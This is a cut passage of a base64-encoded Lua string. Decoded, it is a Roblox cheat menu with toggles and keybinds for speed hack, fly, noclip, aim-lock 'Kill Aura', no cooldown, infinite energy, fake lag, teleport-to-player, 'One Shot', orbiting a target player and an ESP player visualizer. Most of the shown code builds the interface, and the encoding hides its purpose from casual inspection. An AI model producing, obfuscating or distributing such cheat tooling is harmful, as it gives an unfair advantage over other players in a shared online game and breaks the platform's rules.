SBVRGltMi5uZXcoMSwgMCwgMCwgMjApCiAgICAgICAgTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMDAsIDEwMCkKICAgICAgICBMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgICAgIExhYmVsLlRleHRTaXplID0gOAogICAgICAgIExhYmVsLkxheW91dE9yZGVyID0gb3JkZXIKICAgICAgICBMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgIExhYmVsLlBhcmVudCA9IHBhcmVudAogICAgZW5kCgogICAgLS0gPT09IFBBR0UgQ09OVEVOVCA9PT0KICAgIAogICAgLS0gUGxheWVycyBQYWdlIChBaW0gTG9jayAmIEtpbGwgQXVyYSAmIE5vQ2xpcCkKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5QbGF5ZXJzLCAiTW92ZW1lbnQgS2V5cyIsIDkpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLlBsYXllcnMsICJTcGVlZCBIYWNrIEtleSIsICJTcGVlZEtleSIsIDEwKQogICAgY3JlYXRlS2V5YmluZChQYWdlcy5QbGF5ZXJzLCAiRmx5IEtleSIsICJTdGFuZGFyZEZseUtleSIsIDExKQogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlBsYXllcnMsICJNb3ZlbWVudCBTZXR0aW5ncyIsIDEyKQogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLlBsYXllcnMsICJXYWxrIFNwZWVkIiwgIldhbGtTcGVlZFZhbHVlIiwgMTMsIDE2LCA3NTAsIDE2KQogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLlBsYXllcnMsICJGbHkgU3BlZWQiLCAiRmx5U3BlZWRWYWx1ZSIsIDE0LCAwLCAzNTAsIDEwMCkKICAgIGNyZWF0ZUlucHV0KFBhZ2VzLlBsYXllcnMsICJKdW1wIFBvd2VyIiwgIkp1bXBQb3dlclZhbHVlIiwgMTUpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkluZmluaXRlIEp1bXAiLCAiSW5mSnVtcCIsIDE2KQogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlBsYXllcnMsICJUYXJnZXQgU3RyYWYiLCAxNykKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5QbGF5ZXJzLCAiVGFyZ2V0IFN0cmFmIChBdXRvIExvY2spIiwgIkVhc3lMb2NrIiwgMTgpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLlBsYXllcnMsICJMb2NrL1VubG9jayBLZXkiLCAiTG9ja0tleSIsIDE5KQogICAgY3JlYXRlSW5wdXQoUGFnZXMuUGxheWVycywgIkZvbGxvdyBEaXN0YW5jZSIsICJGb2xsb3dEaXN0YW5jZSIsIDIwKQogICAgCiAgICAtLSBTdGF0dXMgTGFiZWwKICAgIGxvY2FsIFRhcmdldExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgVGFyZ2V0TGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIFRhcmdldExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBUYXJnZXRMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTUwLCAxNTAsIDE1MCkKICAgIFRhcmdldExhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBUYXJnZXRMYWJlbC5UZXh0U2l6ZSA9IDgKICAgIFRhcmdldExhYmVsLlRleHQgPSAiU3RhdHVzOiBObyBUYXJnZXQiCiAgICBUYXJnZXRMYWJlbC5MYXlvdXRPcmRlciA9IDIxCiAgICBUYXJnZXRMYWJlbC5QYXJlbnQgPSBQYWdlcy5QbGF5ZXJzCiAgICAKICAgIC0tIExvZ2ljIGZvciBFYXN5TG9jayBUb2dnbGUgQnV0dG9uCiAgICBpZiBUb2dnbGVCdXR0b25zWyJFYXN5TG9jayJdIHRoZW4KICAgICAgICBUb2dnbGVCdXR0b25zWyJFYXN5TG9jayJdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBDb25maWcuRWFzeUxvY2sgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gZ2V0Q2xvc2VzdFBsYXllclRvTW91c2UobmlsLCBmYWxzZSkKICAgICAgICAgICAgICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRhcmdldE5hbWUgPSB0YXJnZXQuTmFtZQogICAgICAgICAgICAgICAgICAgIFRhcmdldExhYmVsLlRleHQgPSAiTE9DS0VEOiAiIC4uIHRhcmdldC5OYW1lCiAgICAgICAgICAgICAgICAgICAgVGFyZ2V0TGFiZWwuVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLktpbGxBdXJhID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIktpbGxBdXJhIl0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJLaWxsQXVyYSJdLkJhY2tncm91bmRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5FYXN5TG9jayA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siRWFzeUxvY2siXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBDb25maWcuVGFyZ2V0TmFtZSA9ICJOb25lIgogICAgICAgICAgICAgICAgVGFyZ2V0TGFiZWwuVGV4dCA9ICJTdGF0dXM6IFVubG9ja2VkIgogICAgICAgICAgICAgICAgVGFyZ2V0TGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApCiAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnYgPSByb290UGFydDpGaW5kRmlyc3RDaGlsZCgiRmx5VmVsb2NpdHkiKQogICAgICAgICAgICAgICAgICAgIGlmIGJ2IHRoZW4gYnY6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBDb25maWcuS2lsbEF1cmEgPSBmYWxzZQogICAgICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siS2lsbEF1cmEiXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siS2lsbEF1cmEiXS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5QbGF5ZXJzLCAiQXV0byBSYWNlIiwgMjEpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkF1dG8gVjMgKFNwYW0gVCkiLCAiQXV0b1YzIiwgMjIpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkF1dG8gQXdha2VuaW5nIiwgIkF1dG9Bd2FrZW5pbmciLCAyMykKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5QbGF5ZXJzLCAiRGFzaCBTZXR0aW5ncyIsIDI0KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlBsYXllcnMsICJFbmFibGUgRGFzaCBMZW5ndGgiLCAiRGFzaExlbmd0aEVuYWJsZWQiLCAyNSkKICAgIGNyZWF0ZVNsaWRlcihQYWdlcy5QbGF5ZXJzLCAiRGFzaCBEaXN0YW5jZSIsICJEYXNoTGVuZ3RoVmFsdWUiLCAyNS41LCAxLCAxODAsIDUwKQogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlBsYXllcnMsICJBbnRpIiwgMjYpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIjAgQ09PTERPV04gKEluZmluaXRlIEF0dGFja3MpIiwgIk5vQ29vbGRvd24iLCAzMikKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5QbGF5ZXJzLCAiSW5maW5pdGUgRW5lcmd5IC8gU3RhbWluYSIsICJJbmZpbml0ZUVuZXJneSIsIDMzKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlBsYXllcnMsICJObyBDbGlwIChXYWxrIFRocm91Z2ggV2FsbHMpIiwgIk5vQ2xpcCIsIDI3KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlBsYXllcnMsICJBbnRpIExhdmEvSGF1bnRlZCIsICJBbnRpTGF2YSIsIDI4KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlBsYXllcnMsICJXYWxrIE9uIFdhdGVyIiwgIldhbGtXYXRlciIsIDI5KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlBsYXllcnMsICJObyBBbmltYXRpb24iLCAiTm9BbmltIiwgMzApCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkFudGkgU3R1biAoTW92ZSBBbHdheXMpIiwgIkFudGlTdHVuIiwgMzEpCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuUGxheWVycywgIkZha2UgTGFnIiwgMzcpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkVuYWJsZSBGYWtlIExhZyIsICJGYWtlTGFnIiwgMzgpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLlBsYXllcnMsICJGYWtlIExhZyBLZXkiLCAiRmFrZUxhZ0tleSIsIDM5KQogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlBsYXllcnMsICJJbnN0YW50IFRQIiwgNDApCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLlBsYXllcnMsICJUUCB0byBQbGF5ZXIgS2V5IiwgIlRQUGxheWVyS2V5IiwgNDEpCiAgICBjcmVhdGVTbGlkZXIoUGFnZXMuUGxheWVycywgIk1heCBSYW5nZSIsICJUUFBsYXllclJhbmdlIiwgNDIsIDAsIDEwMDAsIDEwMDApCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuUGxheWVycywgIk9uZSBTaG90IiwgNDMpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLlBsYXllcnMsICJPbmUgU2hvdCAoTmVlZCBBbnRpIEhhdW50ZWQpIiwgIk9uZVNob3RLZXkiLCA0NCkKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5QbGF5ZXJzLCAiUGFuaWMgTW9kZSIsIDQ0LjEpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkVuYWJsZSBQYW5pYyBNb2RlIiwgIlBhbmljTW9kZSIsIDQ0LjIpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLlBsYXllcnMsICJQYW5pYyBNb2RlIEtleSIsICJQYW5pY01vZGVLZXkiLCA0NC4zKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlBsYXllcnMsICJBdXRvIFBhbmljIChIZWFsdGgpIiwgIlBhbmljTW9kZUhlYWx0aEVuYWJsZSIsIDQ0LjQpCiAgICAKICAgIGxvY2FsIG1heEhlYWx0aFZhbCA9IDMwMDAwCiAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICBtYXhIZWFsdGhWYWwgPSBwbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLk1heEhlYWx0aAogICAgZW5kCiAgICBjcmVhdGVTbGlkZXIoUGFnZXMuUGxheWVycywgIkFjdGl2YXRlIEJlbG93IEhQIiwgIlBhbmljTW9kZU1pbkhlYWx0aCIsIDQ0LjUsIDEwMCwgbWF4SGVhbHRoVmFsLCA0MDAwKQogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLlBsYXllcnMsICJEZWFjdGl2YXRlIEFib3ZlIEhQIiwgIlBhbmljTW9kZU1heEhlYWx0aCIsIDQ0LjYsIDEwMCwgbWF4SGVhbHRoVmFsLCA5MDAwKQogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlBsYXllcnMsICJUb29scyIsIDQ1KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlBsYXllcnMsICJUZWxlcG9ydGVyIFRvb2wiLCAiVGVsZXBvcnRUb29sIiwgNDYpCgogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5QbGF5ZXJzLCAiRmxhc2hTdGVwIiwgNDcpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkFpciBGbGFzaFN0ZXAgKFIpIiwgIkFpckZsYXNoU3RlcCIsIDQ4KQogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLlBsYXllcnMsICJGbGFzaFN0ZXAgUmFuZ2UiLCAiQWlyRmxhc2hTdGVwUmFuZ2UiLCA0OSwgMTAsIDMwMDAsIDIwMCkKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5QbGF5ZXJzLCAiT3JiaXQgUGxheWVyIiwgNTApCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuUGxheWVycywgIkVuYWJsZSBPcmJpdCIsICJPcmJpdFBsYXllciIsIDUxKQogICAgY3JlYXRlS2V5YmluZChQYWdlcy5QbGF5ZXJzLCAiT3JiaXQgS2V5IiwgIk9yYml0UGxheWVyS2V5IiwgNTIpCiAgICAKICAgIGRvCiAgICAgICAgbG9jYWwgRHJvcEZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgRHJvcEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRHJvcEZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIERyb3BGcmFtZS5MYXlvdXRPcmRlciA9IDUzCiAgICAgICAgRHJvcEZyYW1lLlBhcmVudCA9IFBhZ2VzLlBsYXllcnMKICAgICAgICAKICAgICAgICBsb2NhbCBEcm9wQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIERyb3BDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykgRHJvcENvcm5lci5QYXJlbnQgPSBEcm9wRnJhbWUKICAgICAgICBsb2NhbCBEcm9wU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpIERyb3BTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigzNSwgMzUsIDQ1KSBEcm9wU3Ryb2tlLlRoaWNrbmVzcyA9IDEgRHJvcFN0cm9rZS5QYXJlbnQgPSBEcm9wRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBEcm9wTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgRHJvcExhYmVsLlRleHQgPSAiVGFyZ2V0IFBsYXllciIKICAgICAgICBEcm9wTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjQsIDAsIDEsIDApCiAgICAgICAgRHJvcExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgRHJvcExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgIERyb3BMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbU1lZGl1bQogICAgICAgIERyb3BMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgIERyb3BMYWJlbC5UZXh0U2l6ZSA9IDkKICAgICAgICBEcm9wTGFiZWwuUGFyZW50ID0gRHJvcEZyYW1lCiAgICAgICAgbG9jYWwgRHJvcFBhZCA9IEluc3RhbmNlLm5ldygiVUlQYWRkaW5nIikgRHJvcFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDEwKSBEcm9wUGFkLlBhcmVudCA9IERyb3BMYWJlbAogICAgICAgIAogICAgICAgIGxvY2FsIERyb3BCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIERyb3BCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjU1LCAwLCAwLjcsIDApCiAgICAgICAgRHJvcEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQyLCAwLCAwLjE1LCAwKQogICAgICAgIERyb3BCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICAgICAgRHJvcEJ0bi5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICBEcm9wQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIERyb3BCdG4uVGV4dFNpemUgPSA4CiAgICAgICAgRHJvcEJ0bi5UZXh0ID0gKENvbmZpZy5PcmJpdFBsYXllclRhcmdldCB+PSAiIiBhbmQgQ29uZmlnLk9yYml0UGxheWVyVGFyZ2V0KSBvciAiU2VsZWN0IFBsYXllciIKICAgICAgICBEcm9wQnRuLlBhcmVudCA9IERyb3BGcmFtZQogICAgICAgIGxvY2FsIERCQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIERCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpIERCQ29ybmVyLlBhcmVudCA9IERyb3BCdG4KICAgICAgICAKICAgICAgICBsb2NhbCBEcm9wTGlzdCA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgICAgIERyb3BMaXN0LlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCAxNTApCiAgICAgICAgRHJvcExpc3QuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgNSwgMCwgMzUpCiAgICAgICAgRHJvcExpc3QuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMzApCiAgICAgICAgRHJvcExpc3QuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIERyb3BMaXN0LlZpc2libGUgPSBmYWxzZQogICAgICAgIERyb3BMaXN0LlNjcm9sbEJhclRoaWNrbmVzcyA9IDIKICAgICAgICBEcm9wTGlzdC5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKICAgICAgICBEcm9wTGlzdC5aSW5kZXggPSA1CiAgICAgICAgRHJvcExpc3QuUGFyZW50ID0gRHJvcEZyYW1lCiAgICAgICAgbG9jYWwgRExDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRExDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykgRExDb3JuZXIuUGFyZW50ID0gRHJvcExpc3QKICAgICAgICBsb2NhbCBETExheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IikgRExMYXlvdXQuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIgRExMYXlvdXQuUGFyZW50ID0gRHJvcExpc3QKICAgICAgICAKICAgICAgICBsb2NhbCBpc0Ryb3BPcGVuID0gZmFsc2UKICAgICAgICBEcm9wQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpc0Ryb3BPcGVuID0gbm90IGlzRHJvcE9wZW4KICAgICAgICAgICAgRHJvcExpc3QuVmlzaWJsZSA9IGlzRHJvcE9wZW4KICAgICAgICAgICAgaWYgaXNEcm9wT3BlbiB0aGVuCiAgICAgICAgICAgICAgICBEcm9wRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAxOTApCiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhEcm9wTGlzdDpHZXRDaGlsZHJlbigpKSBkbyBpZiB2OklzQSgiVGV4dEJ1dHRvbiIpIHRoZW4gdjpEZXN0cm95KCkgZW5kIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBwIH49IHBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgICAgICAgICAgICAgICAgICBidG4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgICAgICAgICAgICAgICAgICBidG4uVGV4dCA9IHAuRGlzcGxheU5hbWUgLi4gIiAoQCIgLi4gcC5OYW1lIC4uICIpIgogICAgICAgICAgICAgICAgICAgICAgICBidG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgICAgICAgICAgYnRuLlRleHRTaXplID0gOAogICAgICAgICAgICAgICAgICAgICAgICBidG4uWkluZGV4ID0gNgogICAgICAgICAgICAgICAgICAgICAgICBidG4uUGFyZW50ID0gRHJvcExpc3QKICAgICAgICAgICAgICAgICAgICAgICAgYnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk9yYml0UGxheWVyVGFyZ2V0ID0gcC5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEcm9wQnRuLlRleHQgPSBwLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzRHJvcE9wZW4gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRHJvcExpc3QuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEcm9wRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIERyb3BGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgLS0gVmlzdWFscyBQYWdlIChFU1ApCiAgICBkbwogICAgICAgIGxvY2FsIFZpekJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgVml6QnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgVml6QnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDQwKQogICAgICAgIFZpekJ0bi5UZXh0ID0gIk9QRU4gUExBWUVSIFZJU1VBTElaRVIiCiAgICAgICAgVml6QnRuLlRleHRDb2xvcjMgPSBDdXJyZW50VGhlbWVDb2xvcgogICAgICAgIFZpekJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBWaXpCdG4uVGV4dFNpemUgPSAxMAogICAgICAgIFZpekJ0bi5MYXlvdXRPcmRlciA9IDAKICAgICAgICBWaXpCdG4uUGFyZW50ID0gUGFnZXMuVmlzdWFscwogICAgICAgIAogICAgICAgIGxvY2FsIGMgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBjLlBhcmVudCA9IFZpekJ0bgogICAgICAgIAogICAgICAgIGxvY2FsIFZpekZyYW1lID0gbmlsCiAgICAgICAgCiAgICAgICAgVml6QnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgVml6RnJhbWUgdGhlbgogICAgICAgICAgICAgICAgLS0gQ3JlYXRlIFdpbmRvdwogICAgICAgICAgICAgICAgVml6RnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICAgICAgICAgIFZpekZyYW1lLk5hbWUgPSAiUGxheWVyVmlzdWFsaXplciIKICAgICAgICAgICAgICAgIFZpekZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMzUwLCAwLCA0MDApCiAgICAgICAgICAgICAgICBWaXpGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xNzUsIDAuNSwgLTIwMCkKICAgICAgICAgICAgICAgIFZpekZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNSwgMTUsIDIwKQogICAgICAgICAgICAgICAgVml6RnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgICAgICAgICAgVml6RnJhbWUuQWN0aXZlID0gdHJ1ZQogICAgICAgICAgICAgICAgVml6RnJhbWUuRHJhZ2dhYmxlID0gdHJ1ZQogICAgICAgICAgICAgICAgVml6RnJhbWUuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgICAgIFZpekZyYW1lLlBhcmVudCA9IFNjcmVlbkd1aQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpIENvcm5lci5QYXJlbnQgPSBWaXpGcmFtZQogICAgICAgICAgICAgICAgbG9jYWwgU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpIFN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApIFN0cm9rZS5UaGlja25l" .. "c3MgPSAxIFN0cm9rZS5QYXJlbnQgPSBWaXpGcmFtZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBIZWFkZXIKICAgICAgICAgICAgICAgIGxvY2FsIEhlYWRlciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgICAgICAgICAgSGVhZGVyLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgICAgICAgICBIZWFkZXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgICAgICAgICBIZWFkZXIuUGFyZW50ID0gVml6RnJhbWUKICAgICAgICAgICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBIZWFkZXIpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIFRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgICAgICAgICAgVGl0bGUuVGV4dCA9ICJQTEFZRVIgVklTVUFMSVpFUiIKICAgICAgICAgICAgICAgIFRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgLTMwLCAxLCAwKQogICAgICAgICAgICAgICAgVGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDApCiAgICAgICAgICAgICAgICBUaXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgVGl0bGUuVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgICAgICAgICBUaXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgICAgIFRpdGxlLlRleHRTaXplID0gMTIKICAgICAgICAgICAgICAgIFRpdGxlLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgICAgICAgICBUaXRsZS5QYXJlbnQgPSBIZWFkZXIKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgQ2xvc2VCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgICAgICAgICAgQ2xvc2VCdG4uVGV4dCA9ICJYIgogICAgICAgICAgICAgICAgQ2xvc2VCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLCAzMCwgMCwgMzApCiAgICAgICAgICAgICAgICBDbG9zZUJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCA